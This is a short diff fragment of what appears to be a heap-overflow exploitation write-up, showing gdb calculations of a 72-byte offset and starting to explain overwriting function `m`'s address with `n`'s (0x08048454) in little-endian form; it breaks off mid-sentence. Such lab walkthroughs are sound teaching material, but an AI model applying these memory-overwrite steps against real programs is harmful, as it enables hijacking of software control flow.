@@ -159,4 +159,7 @@ That is 72 bytes starting from the buffer beginning:
 
     (gdb) p/x 0x804a048 + 8
         $44 = 0x804a050
-    (gdb) p 0x804a050 -
+    (gdb) p 0x804a050 - 0x804a008
+        $45 = 72
+
+Now let's replace `m` address with `n` address that is 0x08048454 or \x54\x84\x04\x08 in l
